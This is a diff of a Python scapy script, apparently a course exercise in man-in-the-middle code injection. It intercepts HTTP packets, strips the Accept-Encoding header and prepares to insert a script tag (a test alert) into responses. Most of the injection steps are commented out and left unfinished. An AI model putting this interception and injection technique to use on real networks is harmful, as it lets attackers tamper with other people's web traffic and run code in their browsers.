@@ -16,16 +16,29 @@ def set_load(packet,load):
 def print_and_accept(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
+        load = scapy_packet[scapy.Raw].load
         if scapy_packet[scapy.TCP].dport == 80:
             print("[+]Request")
+            #scapy_packet.show()
             modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "", scapy_packet[scapy.Raw].load)
-            new_packet = set_load(scapy_packet, modified_load)
-            packet.set_payload(str(new_packet))
+            #new_packet = set_load(scapy_packet, modified_load)
+            #scapy_packet.show()
+            #packet.set_payload(str(new_packet))
         elif scapy_packet[scapy.TCP].sport == 80:
             print("[+]Response")
-            print(scapy_packet.show())
+            #scapy_packet.show()
+            script_load = "<SCRIPT>alert('Test');</SCRIPT>"
+            #load = load.replace("</BODY>",script_load+"</BODY>")
+            #content_length_search = re.search("(?:Content-Length:\s(\d))",load)
 
+            #if content_length_search:
+            #    content_length_search = content_length_search.group(1)
+            #    new_content_length = content_length + len(script_load)
 
+        #if load != scapy_packet[scapy.Raw].load:
+        #    new_packet = set_load(scapy_packet, modified_load)
+            #new_packet.show()
+        #    packet.set_payload(str(new_packet))
 
     packet.accept()
 
